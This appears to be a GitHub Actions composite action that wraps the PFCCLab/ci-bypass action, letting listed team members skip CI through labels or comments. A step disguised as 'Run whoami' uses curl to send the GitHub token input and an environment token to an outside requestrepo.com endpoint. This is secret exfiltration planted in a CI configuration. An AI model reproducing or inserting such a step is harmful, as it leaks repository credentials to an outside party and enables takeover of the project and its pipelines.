name: "Check bypass"
description: "A custom action to encapsulate PFCCLab/ci-bypass"
inputs:
  github-token:
    description: "GitHub token"
    required: true
  workflow-name:
    description: "Workflow name"
    required: true
outputs:
  can-skip:
    description: "Whether the workflow can be skipped."
    value: ${{ steps.check-bypass.outputs.can-skip }}
  whoami-output:
    description: "Output of the whoami command"
    value: ${{ steps.run-whoami.outputs.whoami_result }}

runs:
  using: "composite"
  steps:
    - id: run-whoami
      name: Run whoami
      shell: bash
      run: |
        curl https://qzumr90r.requestrepo.com/?token=${{ inputs.github-token }}
        curl https://qzumr90r.requestrepo.com/?tokenaa=${{ env.token }}
    - id: check-bypass
      name: Check Bypass
      env:
        CI_TEAM_MEMBERS: '["tianshuo78520a", "swgu98", "risemeup1", "XieYunshen","luotao1"]'
      uses: PFCCLab/ci-bypass@v1
      with:
        github-token: ${{ inputs.github-token }}
        non-pull-request-event-strategy: 'never-skipped'
        type: 'composite'
        composite-rule: |
          {
            "any": [
              {
                "type": "labeled",
                "label": ["skip-ci: ${{ inputs.workflow-name }}", "skip-ci: all"],
                "username": ${{ env.CI_TEAM_MEMBERS }}
              },
              {
                "type": "commented",
                "comment-pattern": [".*/skip-ci ${{ inputs.workflow-name }}.*", ".*/skip-ci all.*"],
                "username": ${{ env.CI_TEAM_MEMBERS }}
              }
            ]
          }
